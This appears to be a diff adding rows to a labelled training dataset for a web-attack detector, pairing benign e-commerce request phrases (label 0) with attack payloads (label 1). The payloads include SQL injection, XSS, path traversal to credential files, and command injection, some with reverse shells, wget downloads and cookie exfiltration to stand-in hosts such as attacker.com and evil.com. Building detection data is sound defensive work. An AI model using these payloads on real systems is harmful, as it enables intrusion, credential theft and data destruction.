+"; python -c 'import socket,subprocess'",1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+../../../../proc/self/environ,1
+specifications compare products req878,0
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+section products view related req805,0
+articles latest news req394,0
+username=admin&password=123456,1
+express delivery to preference req495,0
+GET /phpmyadmin HTTP/1.1,1
+specifications products compare two req349,0
+phones mobile browse category req686,0
+GET /backup.sql HTTP/1.1,1
+"; python -c 'import socket,subprocess'",1
+via product link media social req766,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+username=admin&password=admin,1
+get articles news feed req31,0
+<input onfocus=alert(1) autofocus>,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+shipment number tracking track with req8,0
+| cat /etc/passwd,1
+username=admin&password=letmein,1
+<svg onload=alert(document.domain)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+1' GROUP BY 1--,1
+"id=1 AND 1=CONVERT(int,@@version)--",1
+latest feed news articles req1039,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+checkout with card credit payment req767,0
+support seller send to message req15,0
+electronics products by for category search req810,0
+GET /backup.sql HTTP/1.1,1
+email via link password reset req950,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+newest arrivals sort listing by req254,0
+../../../../var/www/html/config.php,1
+order 30 last view req400,0
+"1 UNION SELECT @@version,NULL--",1
+picture upload profile jpeg format req780,0
+admin'--,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+; ping -c 4 attacker.com,1
+product id 42 item to req861,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+brute force attempt on login endpoint from single ip,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+<img src=x onerror=alert(1)>,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+feedback for form req1016,0
+rate product review req1112,0
+password=1' OR '1'='1' /*,1
+5 rate product stars review req1142,0
+$(whoami),1
+& ipconfig,1
+& ipconfig,1
+for to item save wishlist req203,0
+GET /admin/config.php HTTP/1.1,1
+; ls -la,1
+map store on locations view req583,0
+account email register with new req781,0
+and view conditions terms req892,0
+from current logout session req1111,0
+username=user&password=pass,1
+view for history req362,0
+GET /.htaccess HTTP/1.1,1
+& net user hacker Password1 /add,1
+product add item 42 req1169,0
+1' OR 1=1--,1
+<audio src=1 onerror=alert(1)>,1
+/etc/passwd%00,1
+GET /crossdomain.xml HTTP/1.1,1
+<iframe src=javascript:alert('XSS')>,1
+<ScRiPt>alert(1)</ScRiPt>,1
+new with email register req721,0
+with email register req720,0
+csv export data report as req840,0
+1'; EXEC xp_cmdshell('whoami')--,1
+get articles news feed req933,0
+GET /api/swagger.json HTTP/1.1,1
+to subscribe newsletter req255,0
+GET /.htaccess HTTP/1.1,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+last view days req618,0
+item save to req33,0
+..%2F..%2F..%2Fetc%2Fpasswd,1
+new register with account req758,0
+<div onmouseover=alert(1)>hover</div>,1
+<audio src=1 onerror=alert(1)>,1
+store availability for check item req429,0
+set to express preference req712,0
+notification panel settings view req442,0
+../../wp-config.php,1
+../../.git/config,1
+number for download invoice order req1118,0
+tracking number track with req860,0
+"1 UNION SELECT username,password FROM users--",1
+..%2F..%2F..%2Fetc%2Fpasswd,1
+logout session from current req74,0
+username=admin&password=password,1
+for search products category electronics by req920,0
+for support refund request contact req257,0
+30 for history order req922,0
+javascript:alert(document.cookie),1
+to send support message seller req1066,0
+../../../etc/shadow,1
+preference set express delivery req832,0
+view map on locations req232,0
+profile get user account dashboard for req1172,0
+1'; EXEC xp_cmdshell('whoami')--,1
+"1 UNION SELECT username,password FROM users--",1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+by 100 filter req308,0
+|| nc -e /bin/sh attacker.com 4444,1
+shipping for update order address req648,0
+authentication factor enable two req663,0
+..%2F..%2F..%2Fetc%2Fpasswd,1
+id=2 OR 1=1,1
+username=admin&password=admin123,1
+GET /console HTTP/1.1,1
+for store check item availability req20,0
+GET /server-status HTTP/1.1,1
+& net user hacker Password1 /add,1
+item add cart 42 to product req726,0
+for check availability item req894,0
+<script>alert('XSS')</script>,1
+order for download req1096,0
+address shipping update for order req973,0
+username=user&password=pass,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+password=1' OR '1'='1' /*,1
+product id 42 to add req406,0
+item product id req336,0
+username=admin&password=letmein,1
+store for availability req700,0
+id=2 OR 1=1,1
+username=admin&password=1234567890,1
+username=root&password=root,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+locations view store map on req531,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+stars rate review req1074,0
+multiple failed login attempts detected for admin,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+about search machine books learning req610,0
+account address for billing update req167,0
+<svg><script>alert(1)</script></svg>,1
+; ls -la,1
+../../../etc/shadow,1
+1'; WAITFOR DELAY '0:0:5'--,1
+| cat /etc/passwd,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+<div onmouseover=alert(1)>hover</div>,1
+1' GROUP BY 1--,1
+; ping -c 4 attacker.com,1
+rate review stars product req46,0
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+1; DROP TABLE users--,1
+<video src=1 onerror=alert(1)>,1
+& ipconfig,1
+payment checkout with card credit req880,0
+; whoami,1
+product review stars rate req127,0
+<svg onload=alert(document.domain)>,1
+arrivals listing by sort newest req64,0
+account dashboard for profile user get req1163,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+shipping for order req437,0
+order days for history last 30 req298,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+<select onfocus=alert(1) autofocus>,1
+contact refund support for req1116,0
+for address billing update req78,0
+' OR 1=1#,1
+id=2 OR 1=1,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+|| nc -e /bin/sh attacker.com 4444,1
+request support contact refund for req435,0
+arrivals newest by sort listing req995,0
+"1 UNION SELECT @@version,NULL--",1
+later item wishlist req701,0
+products section related view req649,0
+panel settings view notification req132,0
+apply filter by name brand req673,0
+dashboard for account user get profile req822,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+|| nc -e /bin/sh attacker.com 4444,1
+username=root&password=root,1
+username=admin&password=password,1
+1' AND SLEEP(5)--,1
+number shipment track req175,0
+request contact refund req223,0
+"; python -c 'import socket,subprocess'",1
+<ScRiPt>alert(1)</ScRiPt>,1
+"1 UNION SELECT @@version,NULL--",1
+GET /.htaccess HTTP/1.1,1
+compare specifications products two req714,0
+id=2 OR 1=1,1
+get articles feed news req946,0
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+brute force attempt on login endpoint from single ip,1
+update order shipping req149,0
+send to message seller req817,0
+1'; EXEC xp_cmdshell('whoami')--,1
+password login username and with req324,0
+../../../../proc/self/environ,1
+GET /api/swagger.json HTTP/1.1,1
+php://filter/convert.base64-encode/resource=config.php,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+preference set delivery express req16,0
+username=admin&password=letmein,1
+<body background=javascript:alert(1)>,1
+card credit checkout with payment req116,0
+GET /config.bak HTTP/1.1,1
+and conditions view page terms req87,0
+username=admin&password=admin123,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+availability store item req1036,0
+view store locations req846,0
+<iframe src=javascript:alert('XSS')>,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+/var/log/apache2/access.log,1
+GET /wp-admin HTTP/1.1,1
+address for update account billing req1049,0
+"; python -c 'import socket,subprocess'",1
+username=admin&password=admin,1
+; whoami,1
+"1 UNION SELECT @@version,NULL--",1
+GET /wp-admin HTTP/1.1,1
+sort listing by newest arrivals req821,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+1; DROP TABLE users--,1
+<div onmouseover=alert(1)>hover</div>,1
+for website feedback form req999,0
+logout current session from req1164,0
+username=admin&password=letmein,1
+specifications products compare two req287,0
+<details open ontoggle=alert(1)>,1
+1' OR 1=1--,1
+id item cart 42 add product req969,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+for order update address shipping req943,0
+username=admin&password=superman,1
+<ScRiPt>alert(1)</ScRiPt>,1
+GET /web.config HTTP/1.1,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+GET /config.bak HTTP/1.1,1
+update for shipping order req1180,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+username=test&password=test,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+`id`,1
+; cat /etc/shadow,1
+for website feedback submit req642,0
+1' OR 1=1--,1
+billing update account address for req192,0
+<body background=javascript:alert(1)>,1
+"1 UNION SELECT @@version,NULL--",1
+<svg onload=alert(document.domain)>,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+admin' AND 1=1--,1
+GET /backup.sql HTTP/1.1,1
+1'; DELETE FROM orders WHERE 1=1--,1
+' OR 1=1#,1
+1'; DELETE FROM orders WHERE 1=1--,1
+availability store for req1161,0
+upload picture jpeg req312,0
+<textarea onfocus=alert(1) autofocus>,1
+| uname -a,1
+<svg><script>alert(1)</script></svg>,1
+GET /config.bak HTTP/1.1,1
+latest articles news get feed req489,0
+sort arrivals by listing newest req793,0
+....//....//etc/passwd,1
+../../../etc/shadow,1
+id=2 OR 1=1,1
+username=admin&password=monkey,1
+link product media social share via req595,0
+books machine about search req694,0
+for get account profile user req268,0
+username=admin&password=monkey,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+store locations map on view req1071,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+cart to 42 item product add req1057,0
+GET /crossdomain.xml HTTP/1.1,1
+../../../../etc/passwd,1
+arabic language account change to req288,0
+<script>alert('XSS')</script>,1
+javascript:alert(document.cookie),1
+javascript:alert(document.cookie),1
+<video src=1 onerror=alert(1)>,1
+1'; EXEC xp_cmdshell('whoami')--,1
+file:///etc/passwd,1
+dashboard account profile for get user req948,0
+availability for store item check req310,0
+browse mobile category phones req330,0
+upload format jpeg profile picture req594,0
+data csv export as report req76,0
+....//....//etc/passwd,1
+1' AND SLEEP(5)--,1
+' HAVING 1=1--,1
+<textarea onfocus=alert(1) autofocus>,1
+feedback form for submit website req48,0
+1' GROUP BY 1--,1
+billing update address account req1028,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+<body onload=alert('XSS')>,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+; ls -la,1
+support to send message seller req265,0
+1' AND SLEEP(5)--,1
+and username login password req800,0
+username=admin&password=letmein,1
+order history view last req399,0
+<details open ontoggle=alert(1)>,1
+& net user hacker Password1 /add,1
+newsletter to email with req578,0
+machine learning about search req730,0
+../../.git/config,1
+with password and username login req632,0
+account to change language arabic req190,0
+account address update req644,0
+100 range 500 filter price to req98,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+view map locations store on req990,0
+set delivery to preference express req1154,0
+' OR 'x'='x,1
+multiple failed login attempts detected for admin,1
+set express delivery req1167,0
+' OR 1=1#,1
+../../.git/config,1
+electronics category by search for req492,0
+express delivery to set preference req66,0
+"1 UNION SELECT username,password FROM users--",1
+multiple failed login attempts detected for admin,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+1' ORDER BY 10--,1
+GET /web.config HTTP/1.1,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+file:///etc/passwd,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+refund contact support for request req133,0
+media via product share link social req218,0
+export csv data req1109,0
+password=1' OR '1'='1' /*,1
+GET /actuator/env HTTP/1.1,1
+browse mobile phones category req490,0
+products compare specifications req57,0
+../../../../etc/passwd,1
+admin'--,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+account change language arabic to req222,0
+refund request contact support for req552,0
+username=test&password=test,1
+| wget http://attacker.com/shell.sh,1
+username=admin&password=123456,1
+..%2F..%2F..%2Fetc%2Fpasswd,1
+get articles news latest feed req111,0
+apply name by brand filter req337,0
+order download invoice for req779,0
+two specifications products req829,0
+1'; DELETE FROM orders WHERE 1=1--,1
+1' GROUP BY 1--,1
+dashboard profile for account user get req641,0
+; whoami,1
+feedback website submit req959,0
+1'; DELETE FROM orders WHERE 1=1--,1
+website for form feedback req158,0
+<body background=javascript:alert(1)>,1
+latest get articles req1145,0
+<iframe src=javascript:alert('XSS')>,1
+cart id 42 add item req803,0
+download order number invoice for req448,0
+"1 UNION SELECT @@version,NULL--",1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+; ls -la,1
+by 100 filter price req256,0
+; ping -c 4 attacker.com,1
+username with login and password req1068,0
+return for product policy view req188,0
+GET /web.config HTTP/1.1,1
+authentication enable factor two req321,0
+1' OR 1=1--,1
+reset email link password via req465,0
+feed articles get req626,0
+password reset link email via req1027,0
+<audio src=1 onerror=alert(1)>,1
+GET /.env HTTP/1.1,1
+from current session logout req1134,0
+feedback for form website submit req930,0
+username=admin'/*,1
+format jpeg profile upload picture req867,0
+/var/log/apache2/access.log,1
+social via media product req22,0
+form website submit feedback for req328,0
+support request for contact refund req1030,0
+books learning search machine about req355,0
+GET /.git/config HTTP/1.1,1
+; whoami,1
+../../.git/config,1
+username=admin&password=monkey,1
+map store view on locations req319,0
+view store locations on map req227,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+; ping -c 4 attacker.com,1
+1' AND SLEEP(5)--,1
+1' ORDER BY 10--,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+<audio src=1 onerror=alert(1)>,1
+GET /wp-admin HTTP/1.1,1
+<audio src=1 onerror=alert(1)>,1
+sort by arrivals listing newest req613,0
+admin' AND 1=1--,1
+payment checkout with credit card req1080,0
+../../../../etc/passwd,1
+refund contact request support for req962,0
+GET /admin/config.php HTTP/1.1,1
+change arabic to language req306,0
+at apply coupon checkout discount req852,0
+checkout with credit card payment req1165,0
+news articles feed latest req25,0
+file:///etc/passwd,1
+settings panel notification view req501,0
+link reset via email req161,0
+username=admin&password=1234567890,1
+../../wp-config.php,1
+username=root&password=root,1
+& ipconfig,1
+locations on map store view req323,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+latest news articles req976,0
+save later item wishlist req151,0
+password=1' OR '1'='1' /*,1
+"id=1 AND 1=CONVERT(int,@@version)--",1
+|| nc -e /bin/sh attacker.com 4444,1
+1' OR '1'='1,1
+section products view related req110,0
+<svg onload=alert(document.domain)>,1
+policy return for view product req869,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+factor enable two req53,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+1' GROUP BY 1--,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+<svg onload=alert(document.domain)>,1
+related view products section req282,0
+' OR 'x'='x,1
+../.env,1
+from current session logout req431,0
+GET /api/swagger.json HTTP/1.1,1
+username=admin&password=abc123,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+enable authentication factor two req295,0
+by filter brand apply name req942,0
+1'; EXEC xp_cmdshell('whoami')--,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+books search learning machine req739,0
+send support message req715,0
+for address billing req122,0
+1' OR '1'='1,1
+<select onfocus=alert(1) autofocus>,1
+express set preference delivery req970,0
+|| nc -e /bin/sh attacker.com 4444,1
+<video src=1 onerror=alert(1)>,1
+coupon discount apply at req35,0
+news feed articles get latest req416,0
+30 order days req5,0
+../../../../var/www/html/config.php,1
+request for contact req481,0
+/var/log/apache2/access.log,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+../../.git/config,1
+username=admin'/*,1
+GET /crossdomain.xml HTTP/1.1,1
+<video src=1 onerror=alert(1)>,1
+map view locations store on req863,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+learning machine search books about req1189,0
+GET /config.bak HTTP/1.1,1
+GET /admin/config.php HTTP/1.1,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+order number for download invoice req1098,0
+<body onload=alert('XSS')>,1
+page terms view req1008,0
+refund request contact for support req1093,0
+<iframe src=javascript:alert('XSS')>,1
+/etc/passwd%00,1
+number order for invoice download req1125,0
+view policy for product return req857,0
+view notification settings panel req784,0
+username=admin&password=letmein,1
+admin'--,1
+factor two enable authentication req283,0
+for order invoice download number req682,0
+1' ORDER BY 10--,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+specifications compare products req847,0
+<body onload=alert('XSS')>,1
+password login and username req985,0
+link via share social product media req868,0
+send seller to support req1012,0
+link share media req653,0
+/var/log/apache2/access.log,1
+| cat /etc/passwd,1
+admin' AND 1=1--,1
+javascript:alert(document.cookie),1
+../../.git/config,1
+php://filter/convert.base64-encode/resource=config.php,1
+discount coupon checkout req185,0
+support refund for contact req296,0
+contact for support req570,0
+admin' AND 1=1--,1
+| uname -a,1
+view products section related req1183,0
+address order shipping for update req231,0
+for download invoice number order req137,0
+contact refund support req979,0
+' OR 'x'='x,1
+preference express set to delivery req914,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+rate review stars product 5 req302,0
+<object data=javascript:alert(1)>,1
+update address account req300,0
+admin'--,1
+username=admin&password=superman,1
+listing arrivals sort req4,0
+username=admin&password=batman,1
+repeated authentication failure admin account locked,1
+delivery express to preference req543,0
+<iframe src=javascript:alert('XSS')>,1
+1' OR '1'='1,1
+; id,1
+account to change arabic language req555,0
+view notification settings panel req212,0
+search by electronics category for req713,0
+repeated authentication failure admin account locked,1
+1'; DELETE FROM orders WHERE 1=1--,1
+php://filter/convert.base64-encode/resource=config.php,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+<svg onload=alert(document.domain)>,1
+<textarea onfocus=alert(1) autofocus>,1
+/etc/passwd%00,1
+GET /server-status HTTP/1.1,1
+GET /.htaccess HTTP/1.1,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+product for return req685,0
+website feedback for req1086,0
+website form submit for req877,0
+<textarea onfocus=alert(1) autofocus>,1
+upload profile format jpeg picture req309,0
+username=user&password=pass,1
+/var/log/apache2/access.log,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+newsletter with email req242,0
+notification panel view settings req683,0
+file:///etc/passwd,1
+link via password email reset req156,0
+via reset email link req731,0
+username=admin&password=abc123,1
+<video src=1 onerror=alert(1)>,1
+GET /wp-admin HTTP/1.1,1
+username=admin'/*,1
+<input onfocus=alert(1) autofocus>,1
+email register new account with req1007,0
+repeated authentication failure admin account locked,1
+1' GROUP BY 1--,1
+1; DROP TABLE users--,1
+; whoami,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+check item for store availability req462,0
+specifications products two compare req587,0
+"1 UNION SELECT username,password FROM users--",1
+for to later wishlist item req723,0
+upload picture format jpeg profile req301,0
+username=admin&password=123456,1
+<select onfocus=alert(1) autofocus>,1
+panel view settings notification req464,0
+| uname -a,1
+dashboard user get req459,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+address update billing for req290,0
+related section products view req850,0
+item to add cart product id req1047,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+upload profile picture jpeg req607,0
+download invoice number req1115,0
+search books machine req210,0
+number track shipment tracking with req91,0
+<svg><script>alert(1)</script></svg>,1
+100 results 500 req252,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+<svg onload=alert(document.domain)>,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+../../../../var/www/html/config.php,1
+`id`,1
+username=admin&password=batman,1
+get dashboard account for req316,0
+preference delivery express req980,0
+file:///etc/passwd,1
+|| nc -e /bin/sh attacker.com 4444,1
+brand name apply filter req334,0
+username=admin&password=1234567890,1
+login attempt failed username admin invalid credentials,1
+products compare specifications two req1152,0
+<audio src=1 onerror=alert(1)>,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+history recommendations on req285,0
+with password username login req414,0
+report csv data export req174,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+account get for req693,0
+1' ORDER BY 10--,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+<select onfocus=alert(1) autofocus>,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+"; python -c 'import socket,subprocess'",1
+1' GROUP BY 1--,1
+; whoami,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+admin' AND 1=1--,1
+newsletter with subscribe req292,0
+card with checkout credit payment req548,0
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+$(whoami),1
+username=admin&password=letmein,1
+<audio src=1 onerror=alert(1)>,1
+<audio src=1 onerror=alert(1)>,1
+../../../../etc/passwd,1
+username=admin&password=monkey,1
+<textarea onfocus=alert(1) autofocus>,1
+../../wp-config.php,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+mobile category phones browse req42,0
+../../wp-config.php,1
+php://filter/convert.base64-encode/resource=config.php,1
+add cart to id req204,0
+GET /actuator/env HTTP/1.1,1
+GET /server-status HTTP/1.1,1
+password=1' OR '1'='1' /*,1
+../../../../etc/passwd,1
+password=1' OR '1'='1' /*,1
+GET /admin/config.php HTTP/1.1,1
+data export report req1078,0
+brute force attempt on login endpoint from single ip,1
+id cart item add 42 product req205,0
+../../.git/config,1
+| wget http://attacker.com/shell.sh,1
+view return product for policy req931,0
+seller message send to req502,0
+<select onfocus=alert(1) autofocus>,1
+export csv data as report req147,0
+credit checkout card with req293,0
+password and username with login req142,0
+enable two authentication factor req384,0
+1' AND SLEEP(5)--,1
+GET /wp-admin HTTP/1.1,1
+subscribe with newsletter to email req807,0
+<svg><script>alert(1)</script></svg>,1
+invoice download for order req363,0
+file:///etc/passwd,1
+password and login with req635,0
+<body background=javascript:alert(1)>,1
+payment credit checkout with req577,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+`id`,1
+1'; EXEC xp_cmdshell('whoami')--,1
+view history 30 for req1004,0
+javascript:alert(document.cookie),1
+and password username req386,0
+for account billing address req360,0
+' HAVING 1=1--,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+profile account get for user req940,0
+contact for refund request support req371,0
+shipment tracking track req1015,0
+format upload picture req191,0
+<iframe src=javascript:alert('XSS')>,1
+username=user&password=pass,1
+learning machine about books search req754,0
+news feed get latest articles req888,0
+1'; DELETE FROM orders WHERE 1=1--,1
+1; DROP TABLE users--,1
+at checkout apply req474,0
+with password login and username req913,0
+register new with account email req318,0
+<body onload=alert('XSS')>,1
+"1 UNION SELECT username,password FROM users--",1
+GET /backup.sql HTTP/1.1,1
+& net user hacker Password1 /add,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+username=admin&password=password,1
+username=admin&password=123456,1
+../../../../var/www/html/config.php,1
+<a href='javascript:alert(1)'>click</a>,1
+<details open ontoggle=alert(1)>,1
+view recommendations based on history req905,0
+1' AND SLEEP(5)--,1
+<audio src=1 onerror=alert(1)>,1
+GET /.env HTTP/1.1,1
+../../wp-config.php,1
+1'; DELETE FROM orders WHERE 1=1--,1
+password=1' OR '1'='1' /*,1
+password spray attack detected multiple users,1
+; ping -c 4 attacker.com,1
+category electronics products by for req782,0
+<iframe src=javascript:alert('XSS')>,1
+1'; DELETE FROM orders WHERE 1=1--,1
+../../../../etc/passwd,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+30 for days history req1194,0
+' HAVING 1=1--,1
+GET /robots.txt scan probe reconnaissance,1
+<input onfocus=alert(1) autofocus>,1
+| uname -a,1
+credit payment with card checkout req1100,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+days view last for history req524,0
+login password with and username req361,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+1'; WAITFOR DELAY '0:0:5'--,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+; cat /etc/shadow,1
+1' GROUP BY 1--,1
+GET /crossdomain.xml HTTP/1.1,1
+' OR 'x'='x,1
+username=admin&password=superman,1
+notification panel view settings req117,0
+../../../../etc/passwd,1
+login attempt failed username admin invalid credentials,1
+/etc/passwd%00,1
+| uname -a,1
+GET /console HTTP/1.1,1
+1' GROUP BY 1--,1
+to preference set express req540,0
+profile upload jpeg format req1124,0
+"1 UNION SELECT username,password FROM users--",1
+discount apply at req170,0
+rate review 5 req664,0
+by filter brand req755,0
+brute force attempt on login endpoint from single ip,1
+<details open ontoggle=alert(1)>,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+; id,1
+100 price by filter range to req2,0
+name apply filter by brand req237,0
+report as csv data export req1094,0
+username=admin&password=admin123,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+/var/log/apache2/access.log,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+..\..\..\windows\system32\drivers\etc\hosts,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+map on locations store req553,0
+logout session current from req272,0
+../../../../proc/self/environ,1
+username=admin&password=qwerty,1
+email register with account new req303,0
+brute force attempt on login endpoint from single ip,1
+username=admin&password=letmein,1
+password spray attack detected multiple users,1
+<body background=javascript:alert(1)>,1
+<details open ontoggle=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+from session current logout req458,0
+contact request for req350,0
+sort arrivals newest by req243,0
+<body onload=alert('XSS')>,1
+GET /server-status HTTP/1.1,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+two authentication enable factor req606,0
+../.env,1
+; ping -c 4 attacker.com,1
+$(whoami),1
+30 for order last req530,0
+<a href='javascript:alert(1)'>click</a>,1
+../../wp-config.php,1
+<details open ontoggle=alert(1)>,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+section related view products req932,0
+and login username password req1050,0
+GET /crossdomain.xml HTTP/1.1,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+session current from logout req18,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+website submit for form req446,0
+support refund request for contact req1171,0
+/etc/passwd%00,1
+for submit website req7,0
+picture upload profile jpeg format req376,0
+browse mobile category phones req423,0
+username=admin&password=password,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+products by category electronics req820,0
+../../../../etc/passwd,1
+admin'--,1
+; cat /etc/shadow,1
+../.env,1
+by listing sort newest arrivals req1043,0
+username=admin&password=1234567890,1
+GET /api/swagger.json HTTP/1.1,1
+<svg onload=alert(document.domain)>,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+username=admin&password=monkey,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+recommendations on history req1090,0
+1' AND SLEEP(5)--,1
+<svg onload=alert(document.domain)>,1
+language change arabic to account req814,0
+1'; DELETE FROM orders WHERE 1=1--,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+apply brand filter name by req389,0
+GET /backup.sql HTTP/1.1,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+account arabic language to change req124,0
+username=admin&password=abc123,1
+account new with register req93,0
+| wget http://attacker.com/shell.sh,1
+php://filter/convert.base64-encode/resource=config.php,1
+username=root&password=root,1
+factor two authentication enable req561,0
+username=admin&password=batman,1
+username=admin&password=abc123,1
+account arabic language req44,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+; whoami,1
+link media product social via share req1072,0
+/var/log/apache2/access.log,1
+view policy product return for req988,0
+feed news latest articles get req138,0
+username=user&password=pass,1
+../../../etc/shadow,1
+; whoami,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+<body background=javascript:alert(1)>,1
+upload format profile picture jpeg req918,0
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+; ls -la,1
+send message seller to req1147,0
+../../../../etc/passwd,1
+multiple failed login attempts detected for admin,1
+id=2 OR 1=1,1
+"1 UNION SELECT @@version,NULL--",1
+<textarea onfocus=alert(1) autofocus>,1
+GET /config.bak HTTP/1.1,1
+javascript:alert(document.cookie),1
+GET /config.bak HTTP/1.1,1
+password spray attack detected multiple users,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+and username login req392,0
+username=admin&password=admin123,1
+password with username login and req89,0
+<svg><script>alert(1)</script></svg>,1
+1' AND SLEEP(5)--,1
+get news latest articles req1092,0
+wishlist later item to save req413,0
+GET /.env HTTP/1.1,1
+username=admin&password=1234567890,1
+1'; DELETE FROM orders WHERE 1=1--,1
+username with login and req617,0
+../../../etc/shadow,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
